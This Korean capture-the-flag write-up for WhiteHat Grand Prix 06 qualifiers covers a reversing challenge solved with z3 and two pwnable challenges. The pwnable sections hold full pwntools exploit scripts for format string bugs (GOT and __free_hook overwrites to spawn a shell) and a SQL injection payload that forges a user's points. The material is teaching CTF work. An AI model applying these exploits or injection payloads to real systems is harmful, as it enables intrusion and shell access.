---
title : WhiteHat Grand Prix 06 - Quals
categories : ['2020', 'WhiteHat Grand Prix 06']
---

## Reversing

### Reversing1 - 200pts

`whitehat.exe`, `output.png`가 주어진다.

`whitehat.exe`의 `main`부터 하나씩 분석해보자

#### `main` 함수

```c++
data = fopen("data", "rb");
ptr = (char ** ) operator new [](0x3C u);
for (i = 0; i <= 14; ++i)
  ptr[i] = (char * ) operator new [](0x1000 u);
for (j = 0; j <= 14; ++j)
  len = fread(ptr[j], 1 u, 0x1000 u, data); // len에는 ptr[14]에 읽어들인 바이트 수가 저장됨
fclose(data);
for (k = 0; k <= 6; ++k) {
  if ((( * ptr[2 * k] + * ptr[2 * k + 1]) & 1) == 0)
    std::swap < unsigned char * > ( & ptr[2 * k], & ptr[2 * k + 1]);
}
if (( * ptr)[10] != 7 || ptr[13][10] != 12)
  return 1;
for (m = 1; m <= 6; ++m) {
  tmp = ptr[m][10] - 52;
  if (tmp > 9 u)
    return 1;
}
for (n = 7; n <= 11; ++n) {
  tmp = ptr[n][10] - 77;
  if (tmp > 9 u)
    return 1;
}
if ((unsigned __int8) ptr[12][10] - 34 > 9)
  return 1;
v5 = pow((double)(unsigned __int8) ptr[1][10], 3.0);
v6 = pow((double)(unsigned __int8) ptr[2][10], 3.0) + v5;
tmp = (int)(double)(pow((double)(unsigned __int8) ptr[3][10], 3.0) + v6);
if (tmp != 0x62)
  return 1;
v7 = pow((double)(unsigned __int8) ptr[4][10], 3.0);
v8 = pow((double)(unsigned __int8) ptr[5][10], 3.0) + v7;
v9 = pow((double)(unsigned __int8) ptr[6][10], 3.0) + v8;
tmp = (int)(double)(pow((double)(unsigned __int8) ptr[7][10], 3.0) + v9);
if (tmp != 0x6B)
  return 1;
v10 = pow((double)(unsigned __int8) ptr[9][10], 3.0);
v11 = pow((double)(unsigned __int8) ptr[10][10], 3.0) + v10;
v12 = pow((double)(unsigned __int8) ptr[11][10], 3.0) + v11;
tmp = (int)(double)(pow((double)(unsigned __int8) ptr[12][10], 3.0) + v12);
if (tmp != 0xBF)
  return 1;
arr1 = (unsigned __int8 * ) operator new [](0xF000 u);
for (ii = 0;
  (int)(len + 0xE000) > ii; ++ii)
  arr1[ii] = ptr[ii / 4096][ii % 4096];
v4 = SHF(arr1, len + 0xE000);
flag(v4);
v13[0] = 0;
v13[1] = 0x1B;
v13[2] = 0xBA;
v13[3] = 0x30;
v13[4] = 0x50;
v13[5] = 0xB1;
v13[6] = 0x7E;
v13[7] = 0xD4;
v13[8] = 0xF;
v13[9] = 0x44;
v13[10] = 0x31;
v13[11] = 0x77;
v13[12] = 0xD6;
v13[13] = 0xB5;
for (jj = 0; jj <= 13; ++jj)
  ptr[jj][10] = v13[jj];
data = fopen("output.png", "wb");
for (kk = 0; kk <= 13; ++kk)
  fwrite(ptr[kk], 1 u, 0x1000 u, data);
fwrite(ptr[14], 1 u, len, data);
fclose(data);
std::operator << < std::char_traits < char >> ((std::ostream::sentry * ) & std::cout, "\n");
system("pause");
return 0;
```

분석해보면 다음 동작들을 한다.

1. `ptr[2*i][0] + ptr[2*i+1][0]` 이 짝수면 `ptr[2*i]`, `ptr[2*i+1]`을 swap
2. `ptr[i][10]` 값을 `v13`으로 바꿈

중간에 return되면 `output.png` 파일이 생성되지 않으니 주어진 조건은 다음과 같다

```
arr = {ptr[0][10], ptr[1][10], ... ptr[14][10]}

1. arr[0] == 7
2. arr[13] == 12
3. arr[m] - 52 <= 9     // 1 <= m <= 6
4. arr[n] - 77 <= 9     // 7 <= n <= 11
5. arr[12] - 34 <= 9
6. int(pow(arr[1], 3.0) + pow(arr[2], 3.0) + pow(arr[3], 3.0)) == 0x62
7. int(pow(arr[4], 3.0) + pow(arr[5], 3.0) + pow(arr[6], 3.0) + pow(arr[7], 3.0)) == 0x6B
8. int(pow(arr[9], 3.0) + pow(arr[10], 3.0) + pow(arr[11], 3.0) + pow(arr[12], 3.0)) == 0xBF
```


#### `flag` 함수

{% raw %}
```c++
int __cdecl flag(unsigned __int64 n) {
  int result; // eax
  __int64 FLAG; // rax
  unsigned __int64 _n; // [esp+18h] [ebp-30h] BYREF
  char Str1[2]; // [esp+26h] [ebp-22h] BYREF
  __int16 Str2; // [esp+28h] [ebp-20h]
  char endOfStr; // [esp+2Ah] [ebp-1Eh]
  int data; // [esp+30h] [ebp-18h]
  FILE * Stream; // [esp+34h] [ebp-14h]
  void * Buffer; // [esp+38h] [ebp-10h]
  unsigned __int64 * ptr; // [esp+3Ch] [ebp-Ch]

  _n = n;
  ptr = & _n;
  Str1[0] = n - 0x7D;
  Str1[1] = BYTE1(n) + 0x7C;
  Str2 = WORD1(n) - 0x5100;
  endOfStr = '\0';
  result = strcmp(Str1, "Flag");
  if (!result) { 
    Buffer = (void * ) operator new [](0x186A0 u);
    Stream = fopen("data", "rb");
    data = fread(Buffer, 1 u, 0x186A0 u, Stream);
    fclose(Stream);
    FLAG = SHF((unsigned __int8 * ) Buffer, data);
    return printf("Flag = WhiteHat{%llu}", FLAG);
  }
  return result;
}
```
{% endraw %}

`flag` 함수는 다음과 같이 동작한다.

{% raw %}
```c++
char *n = ...
n[0] -= 0x7D;
n[1] += 0x7C;
n[3] -= 0x51; // Str2 = WORD1(n) - 0x5100; 인데 little endian을 고려하면 n[3] - 0x51이 됨
n[5] = 0;
result = strcmp(n, "Flag");
if (!result) {
  ...
  return printf("Flag = WhiteHat{%llu}", FLAG);
}
return result;
```
{% endraw %}

`data`를 복구하여 `whitehat.exe`를 실행하면 플래그를 출력할 것으로 보인다.

#### `SHF` 함수

{% raw %}
```c++
__int64 __cdecl SHF(unsigned __int8 * arr, int len) {
  int i; // [esp+14h] [ebp-Ch]
  __int64 res; // [esp+18h] [ebp-8h]

  res = 0x2FD2B4 LL;
  for (i = 0; i < len; ++i) {
    LODWORD(res) = arr[i] ^ (unsigned int) res;
    res *= 0x66EC73 LL;
  }
  return res;
}
```
{% endraw %}

`SHF`는 simple hash function의 약자인 것 같다.

`SHF`, `flag`함수를 분석해보았을 때 원본 `data`의 해시값이 플래그다.

`output.jpg`에서 `ptr[i][10]`과 swap된 부분만 복구하면 `data`를 얻을 수 있다.

#### solution

다음 순서로 `data`를 얻을 수 있다.

1. `main`함수에 주어진 조건과 `flag` 함수 인자로 전달되는 hash값으로 `ptr[i][10]` 복구
2. `swap`된 부분 복구

이후 `SHF(data)`를 계산해 flag를 얻을 수 있다.

#### sol.py

{% raw %}
```python
from z3 import *

with open("output.png", 'rb') as f:
    data = list(f.read())

s = Solver()
arr = [BitVec(f'x{i}', 8) for i in range(14)]

def bvCube(bv):
    return bv * bv * bv

# 1. arr[0] == 7
s.add(arr[0] == 7)

# 2. arr[13] == 12
s.add(arr[13] == 12)

# 3. arr[m] - 52 <= 9     // 1 <= m <= 6
for i in range(1, 7):
    s.add(And(0 <= arr[i] - 52, arr[i] - 52 <= 9))

# 4. arr[n] - 77 <= 9     // 7 <= n <= 11
for i in range(7, 12):
    s.add(And(0 <= arr[i] - 77, arr[i] - 77 <= 9))

# 5. arr[12] - 34 <= 9
s.add(And(0 <= arr[12] - 34, arr[12] - 34 <= 9))

# 6. int(pow(arr[1], 3.0) + pow(arr[2], 3.0) + pow(arr[3], 3.0)) == 0x62
s.add((bvCube(arr[1]) + bvCube(arr[2]) + bvCube(arr[3])) & 0xff == 0x62)

# 7. int(pow(arr[4], 3.0) + pow(arr[5], 3.0) + pow(arr[6], 3.0) + pow(arr[7], 3.0)) == 0x6B
s.add((bvCube(arr[4]) + bvCube(arr[5]) + bvCube(arr[6]) + bvCube(arr[7])) & 0xff == 0x6B)

# 8. int(pow(arr[9], 3.0) + pow(arr[10], 3.0) + pow(arr[11], 3.0) + pow(arr[12], 3.0)) == 0xBF
s.add((bvCube(arr[9]) + bvCube(arr[10]) + bvCube(arr[11]) + bvCube(arr[12])) & 0xff == 0xBF)

def SHF(arr):
    res = 0x2FD2B4
    for i in range(len(arr)):
        res = arr[i] ^ res
        res = (res * 0x66EC73) & ((1 << 64) - 1)
    return res

def getTargetHash():
    a = list(b'Flag')
    a[0] = (a[0] + 0x7D) & 0xFF
    a[1] = (a[1] - 0x7C) & 0xFF
    a[3] = (a[3] + 0x51) & 0xFF
    return int.from_bytes(bytes(a), 'little')

def getFlag(swappedData):
    for i in range(7):
        if (swappedData[0x1000*2*i] + swappedData[0x1000*(2*i+1)]) & 1 == 0:
            swappedData[0x1000*2*i:0x1000*(2*i+1)], swappedData[0x1000*(2*i+1):0x1000*(2*i+2)] = swappedData[0x1000*(2*i+1):0x1000*(2*i+2)], swappedData[0x1000*2*i:0x1000*(2*i+1)]
    
    print(f"Flag = WhiteHat{{{SHF(swappedData)}}}")

targetHash = getTargetHash()
cnt = 1

while True:
    if s.check() != sat:
        break
    if cnt % 1000 == 0:
        print(cnt)
    cnt += 1
    
    m = s.model()
    res = [int(m[i].as_long()) for i in arr]
    for i in range(14):
        data[0x1000*i + 10] = res[i]

    if SHF(data) & 0xFFFFFFFF == targetHash:
        with open('data', 'wb') as f:
            f.write(bytes(data))
        print("found!")
        getFlag(data)
        break

    s.add(And([arr[i] == res[i] for i in range(14)]) == False)
```
{% endraw %}

```console
$python3 sol.py 
1000
2000
3000
4000
5000
6000
7000
8000
9000
10000
11000
12000
13000
14000
15000
16000
17000
found!
Flag = WhiteHat{8333769562446613979}
```

## Pwnable

### Pwn01

`loop`이랑 `libc.so.6`이 주어진다.

`func03` 함수에 format string bug 취약점이 존재한다.

```c++
__int64 __fastcall vuln(const char * buf) {
  printf("Hello ");
  printf(buf, 0 LL); // fsb!
  puts("\nWe will suggest you some interesting places in Vietnam");
  puts("[+] Ha Long bay.");
  puts("[+] Phu Quoc island.");
  puts("[+] Kong island.");
  puts("[+] Hoan Kiem lake.");
  puts("[+] Sapa.");
  puts("[+] ...");
  puts("Wish you have great moments in Vietnam!");
  return 0 LL;
}
```

```console
$ checksec loop
[*] '/pwd/loop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

PIE가 안 걸려있다.

```console
$ ./loop
Welcome to VietNam!!!
What's your name? AAAAAAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
Hello AAAAAAAA 0x7fffde161b20 (nil) (nil) 0x6 0x6 0x4000000002 0x7fffde1641f0 0x7fffde164240 0x4008a4 0x7fffde164338 0x100000000 0x4141414141414141 0x2520702520702520 0x2070252070252070 0x7025207025207025
...
```

%12$p 부터 payload가 시작된다.

```console
pwndbg> x/20gx 0x7fffffffe540
0x7fffffffe540: 0x4141414141414141      0x4141414141414141
0x7fffffffe550: 0x00000000000a4141      0x000000000040090d
0x7fffffffe560: 0x00007ffff7fbe2e8      0x00000000004008c0
0x7fffffffe570: 0x0000000000000000      0x0000000000400630
0x7fffffffe580: 0x00007fffffffe680      0x38aa051f150a9400
0x7fffffffe590: 0x0000000000000000      0x00007ffff7df10b3
0x7fffffffe5a0: 0x0000000000000000      0x00007fffffffe688
0x7fffffffe5b0: 0x0000000100000000      0x0000000000400805
0x7fffffffe5c0: 0x00000000004008c0      0xb38d361b52a7a337
0x7fffffffe5d0: 0x0000000000400630      0x00007fffffffe680
pwndbg> x/i 0x00007ffff7df10b3
   0x7ffff7df10b3 <__libc_start_main+243>:      mov    edi,eax
```

`__libc_start_main+243`은 %23$p 다.

fsb 취약점이 이용되기 전에 `puts`는 한 번도 호출되지 않으므로 `puts_got`에는 code 영역의 주소가 적혀있다.

따라서 `puts_got`의 하위 2바이트만 덮어씌워 `main` 함수가 다시 호출되도록 할 수 있다.

#### exploit.py

로컬 환경에서만 돌렸다.

문제 libc로는 `one_gadget`을 쓸 수 있는 것 같다.

{% raw %}
```python
from pwn import *

p = process("./loop")
e = ELF("./loop")
lib = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")

def fsb(payload):
    p.sendlineafter("What's your name?", payload)

def overwrite_got(got, val):
    low = val & 0xffff
    middle = (val >> 16) & 0xffff

    target1 = (low, got)
    target2 = (middle, got + 2)

    if low > middle:
        target1, target2 = target2, target1

    payload = f'%{target1[0]}c%16$hn'
    payload += f'%{target2[0] - target1[0]}c%17$hn'
    payload = payload.ljust(32, 'A').encode()
    payload += p64(target1[1]) + p64(target2[1])
    fsb(payload)

# puts_got -> main
payload = f'%{e.sym["main"] & 0xffff}c%15$hn%23$p@@'.ljust(24, 'A').encode()
payload += p64(e.got['puts'])
fsb(payload)

# libc leak
p.recvuntil("0x")
libc_base = int(p.recvuntil('@@')[:-2], 16) - lib.sym['__libc_start_main'] - 243
print(hex(libc_base))

system = libc_base + lib.sym['system']
binsh = libc_base + next(lib.search(b"/bin/sh\x00"))
puts = libc_base + lib.sym['puts']

# setvbuf -> puts
overwrite_got(e.got['setvbuf'], puts)

# stderr -> binsh
overwrite_got(e.got['stderr'], binsh)

# setvbuf -> system
overwrite_got(e.got['setvbuf'], system)

p.interactive()
```
{% endraw %}

### Pwn02

`bookstore`랑 `libc.so.6`이 주어진다.

```console
$ checksec bookstore
[*] '/pwd/bookstore'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```console
$ ./libc.so.6
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.
...
```

glibc 버전은 2.27이다.

함수가 매우 많다. 하나씩 분석해보자

#### `main`

```c++
void __fastcall __noreturn main(int a1, char ** a2, char ** a3) {
  unsigned int v3; // [rsp+28h] [rbp-8h]

  initialize();
  v3 = initDB();
  while (1) {
    menu();
    switch ((unsigned int) readInt()) {
    case 1 u:
      register(v3);
      break;
    case 2 u:
      login(v3);
      break;
    case 3 u:
      store(v3);
      break;
    case 4 u:
      writeBook();
      break;
    case 5 u:
      readBook();
      break;
    case 6 u:
      logout();
      break;
    default:
      continue;
    }
  }
}
```

#### `register`

```c++
unsigned __int64 register() {
  const char * error_msg; // [rsp+18h] [rbp-1B8h] BYREF
  unsigned __int8 username[80]; // [rsp+20h] [rbp-1B0h] BYREF
  unsigned __int8 password[80]; // [rsp+70h] [rbp-160h] BYREF
  char query[264]; // [rsp+C0h] [rbp-110h] BYREF
  unsigned __int64 v5; // [rsp+1C8h] [rbp-8h]

  v5 = __readfsqword(0x28 u);
  error_msg = 0 LL;
  memset(username, 0, 0x48 uLL);
  memset(password, 0, 0x48 uLL);
  memset(query, 0, 0x100 uLL);
  if (isLogged == 1) {
    puts("You are already logged");
  } else {
    printf("Username: ");
    readNbytes(username, 64);
    printf("Password: ");
    readNbytes(password, 64);
    snprintf(
      query,
      0x100 uLL,
      "INSERT INTO users (username,password,point) VALUES('%s','%s',0)",
      (const char * ) username,
      (const char * ) password);
    if ((unsigned int) sqlite3_exec(db_handler, query, 0 LL, 0 LL, & error_msg)) {
      printf("SQL error: %s\n", error_msg);
      sqlite3_free(error_msg);
    } else {
      puts("Register Successfully");
    }
  }
  return __readfsqword(0x28 u) ^ v5;
}
```

#### `login`

```c++
unsigned __int64 login()
{
  const char *name; // rax
  __int64 statement[2]; // [rsp+20h] [rbp-1C0h] BYREF
  unsigned __int8 username[80]; // [rsp+30h] [rbp-1B0h] BYREF
  unsigned __int8 password[80]; // [rsp+80h] [rbp-160h] BYREF
  char query[264]; // [rsp+D0h] [rbp-110h] BYREF
  unsigned __int64 v6; // [rsp+1D8h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  statement[1] = 0LL;
  memset(username, 0, 0x48uLL);
  memset(password, 0, 0x48uLL);
  memset(query, 0, 0x100uLL);
  if ( isLogged == 1 )
  {
    puts("You are already logged");
  }
  else
  {
    printf("Username: ");
    readNbytes(username, 64);
    if ( (unsigned int)checkQuote(username) == 1 )
    {
      puts("Attack detect!");
      exit(0);
    }
    printf("Password: ");
    readNbytes(password, 64);
    if ( (unsigned int)checkQuote(password) == 1 )
    {
      puts("Attack detect!");
      exit(0);
    }
    snprintf(
      query,
      0x100uLL,
      "SELECT id,username,password,point FROM users Where username='%s' and password='%s' ORDER BY id DESC",
      (const char *)username,
      (const char *)password);
    sqlite3_prepare_v2(db_handler, query, 0xFFFFFFFFLL, statement, 0LL);
    if ( (unsigned int)sqlite3_step(statement[0]) == 100 )// SQLITE_ROW == 100
    {
      puts("Login Successfully");
      currentUser = sqlite3_column_int(statement[0], 0LL);
      name = (const char *)sqlite3_column_text(statement[0], 1LL);
      printf("\nXin chao %s\n", name);
      isLogged = 1;
      point = sqlite3_column_int(statement[0], 3LL);
    }
    else
    {
      puts("Username or password incorrect");
    }
    sqlite3_finalize(statement[0]);
  }
  return __readfsqword(0x28u) ^ v6;
}
```

#### store

```c++
int store()
{
  int result; // eax

  if ( !isLogged )
    return puts("You need login!");
  while ( 1 )
  {
    while ( 1 )
    {
      storeMenu();
      result = readInt();
      if ( result != 1 )
        break;
      sell();
    }
    if ( result != 2 )
      break;
    reward();
  }
  return result;
}
```

#### `sell`

```c++
int sell() {
  unsigned int idx; // [rsp+4h] [rbp-Ch]
  void ** ptr; // [rsp+8h] [rbp-8h]

  printf("Your point: %d\n", (unsigned int) point);
  printf("Enter book id to sell: ");
  idx = readInt();
  if (idx > 9)
    return puts("Index big or small!");
  if (!books[idx])
    return puts("Book not found!");
  ptr = (void ** ) books[idx];
  free(ptr[10]);
  free(ptr[9]);
  free(ptr);
  books[idx] = 0 LL;
  return ++point;
}
```

#### `reward`

```c++
unsigned __int64 reward() {
  __int64 v1; // [rsp+8h] [rbp-218h] BYREF
  char format[256]; // [rsp+10h] [rbp-210h] BYREF
  char query[264]; // [rsp+110h] [rbp-110h] BYREF
  unsigned __int64 v4; // [rsp+218h] [rbp-8h]

  v4 = __readfsqword(0x28 u);
  memset(query, 0, 0x100 uLL);
  memset(format, 0, sizeof(format));
  v1 = 0 LL;
  if (point <= 999999999) {
    puts("You need poing >= 1000000000");
  } else {
    point -= 1000000000;
    snprintf(query, 0x100 uLL, "UPDATE users SET point=%d WHERE id=%d", (unsigned int) point, (unsigned int) currentUser);
    sqlite3_exec(db_handler, query, 0 LL, 0 LL, & v1);
    printf("Enter address: ");
    readNbytes((unsigned __int8 * ) format, 256);
    puts("We will send your reward to: ");
    printf(format); // fsb!
    puts("\nSuccessfully!");
  }
  return __readfsqword(0x28 u) ^ v4;
}
```

#### `writeBook`

```c++
int writeBook() {
  __int64 ret; // rax
  int i; // [rsp+4h] [rbp-Ch]
  book * book; // [rsp+8h] [rbp-8h]

  LODWORD(ret) = isLogged;
  if (isLogged == 1) {
    for (i = 0; i <= 9; ++i) {
      ret = books[i];
      if (!ret) {
        book = (book * ) malloc(0x58 uLL);
        printf("Name: ");
        readNbytes(book -> name, 64);
        printf("Author: ");
        book -> author = (char * ) malloc(0x40 uLL);
        readNbytes(book -> author, 64);
        book -> contents = (char * ) malloc(0x500 uLL);
        printf("Content: ");
        readNbytes(book -> contents, 1280);
        books[i] = book;
        LODWORD(ret) = puts("Successfully");
        return ret;
      }
    }
  } else {
    LODWORD(ret) = puts("You need login!");
  }
  return ret;
}
```

#### `readBook`

```c++
int readBook() {
  int i; // [rsp+0h] [rbp-10h]
  unsigned int index; // [rsp+4h] [rbp-Ch]
  __int64 book; // [rsp+8h] [rbp-8h]

  puts("List Book");
  puts("ID | Name | Author");
  for (i = 0; i <= 9; ++i) {
    if (books[i])
      printf("%d | %s | %s\n", (unsigned int) i, (const char * ) books[i], *(const char ** )(books[i] + 72 LL));
  }
  printf("Enter index: ");
  index = readInt();
  if (index > 9)
    return puts("Index big or small!");
  if (!books[index])
    return puts("Not found!");
  book = books[index];
  printf("Name: %s\n", (const char * ) book);
  printf("Author: %s\n", *(const char ** )(book + 0x48));
  return printf("Content: %s\n", *(const char ** )(book + 0x50));
}
```

#### `logout`

```c++
int logout() {
  int result; // eax

  result = puts("Logout Successfully");
  isLogged = 0;
  return result;
}
```

`store` -> `reward` 에 format string bug가 존재한다.

근데 fsb 한 번에 `point`가 1000000000이 필요하다.

`point`는 `sell`을 한 번 하면 1 오른다.

정상적인 방법으로는 1000000000 포인트를 모을 수 없으므로 `point`를 조작할 방법을 찾아야 한다.

#### sql injection

`register` 함수를 보면

`snprintf(query, 0x100uLL, "INSERT INTO users (username,password,point) VALUES('%s','%s',0)", username, password);`

에서 `username`을 조작해 sql injection이 가능하다.

`username`을 `zzre', '1234', 12345)" --`로 주면

`"INSERT INTO users (username,password,point) VALUES('zzre', '1234', 12345)" -- ~~`가 돼서 `point`가 12345인 user를 생성할 수 있다.

#### exploit

이제 `point`를 조작할 수 있으니 fsb를 즐길 수 있다.

fsb로 libc leak을 한 뒤

`__free_hook`을 `system`으로 덮어쓰고 `/bin/sh`를 써둔 청크를 `sell`을 이용해 `free`하면 쉘을 획득할 수 있다.

```console
*RAX  0x0
 RBX  0x55ec7e201d50 ◂— push   r15
*RCX  0x7f479ab840a7 (write+23) ◂— cmp    rax, -0x1000 /* 'H=' */
*RDX  0x0
*RDI  0x7ffeaab1a770 ◂— 'AAAAAAAA %p %p %p %p %p %p %p %p %p %p %p %p %p'
*RSI  0x7f479ac63723 (_IO_2_1_stdout_+131) ◂— 0xc647e0000000000a /* '\n' */
*R8   0x1e
*R9   0xf
*R10  0x55ec7e201fee ◂— outsb  dx, byte ptr [rsi] /* 'Enter address: ' */
 R11  0x246
 R12  0x55ec7e200e40 ◂— xor    ebp, ebp
 R13  0x7ffeaab1aae0 ◂— 0x1
 R14  0x0
 R15  0x0
*RBP  0x7ffeaab1a980 —▸ 0x7ffeaab1a9b0 —▸ 0x7ffeaab1a9f0 ◂— 0x0
*RSP  0x7ffeaab1a760 —▸ 0x55ec7fd94308 —▸ 0x7f479ad8fea0 ◂— 0x7800000003
*RIP  0x55ec7e2018ec ◂— call   0x55ec7e200ce0
──────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────
 ► 0x55ec7e2018ec    call   printf@plt                <printf@plt>
        format: 0x7ffeaab1a770 ◂— 'AAAAAAAA %p %p %p %p %p %p %p %p %p %p %p %p %p'
```

```
 We will send your reward to: 
AAAAAAAA 0x7f479ac63723 (nil) 0x7f479ab840a7 0x1e 0xf 0x55ec7fd94308 (nil) 0x4141414141414141 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x70252070252070
```

%1$p 는 `_IO_2_1_stdout_+131`이고 

`format`은 %8$p다.

#### exploit.py

{% raw %}
```python
from pwn import *

p = process("./bookstore")
lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# p = process(['./ld-50390b2ae8aaa73c47745040f54e602f.so.2', './bookstore'], env={"LD_PRELOAD":"./libc.so.6"})
# lib = ELF("./libc.so.6")

def register(name):
    username = f"{name}', '{name}', {(1<<31) - 1}) --"
    p.sendlineafter("Choice:", '1')
    p.sendlineafter("Username:", username)
    p.sendlineafter("Password:", '')

def login(name):
    p.sendlineafter("Choice:", '2')
    p.sendlineafter("Username:", name)
    p.sendlineafter("Password:", name)

def logout():
    p.sendlineafter("Choice:", '6')

def writeBook():
    p.sendlineafter("Choice:", '4')
    for i in range(3): 
        p.sendlineafter(":", '/bin/sh')
    
def store():
    p.sendlineafter("Choice:", '3')

def sell(index):
    p.sendlineafter(">>", '1')
    p.sendlineafter(":", str(index))

def fsb(payload):
    p.sendlineafter(">>", '2')
    p.sendlineafter("Enter address:", payload)

register('zzre')
login('zzre')
writeBook()
store()

# libc leak
fsb("%1$p@@")
p.recvuntil("0x")
libc_base = int(p.recvuntil("@@")[:-2], 16) - lib.sym['_IO_2_1_stdout_'] - 131
print(hex(libc_base))

system = libc_base + lib.sym['system']
free_hook = libc_base + lib.sym['__free_hook']
print(hex(free_hook))
pause()

# free_hook -> system
payload = ''
tmp = 0
for i in range(3):
    val = (system >> i*16) & 0xffff
    payload += f'%{(val - tmp) & 0xffff}c%{{}}$hn'
    tmp = val

idx = 8 + (len(payload) // 8) + 2       # payload[len(payload) + 16:] = addr
payload = payload.format(idx, idx+1, idx+2).encode()
payload = payload.ljust((len(payload) // 8)*8 + 16)

for i in range(3):
    payload += p64(free_hook + 2*i)

fsb(payload)

# system("/bin/sh")
sell(0)

p.interactive()
```
{% endraw %}
내부적으로 heap을 쓰는 함수들이 있어서 그런지 2바이트씩 덮어쓰는 방식으로 하면 터져서 한 번에 덮어주도록 payload를 구성해야 한다.

---

나머지 문제들은 바이너리를 못 찾았다..
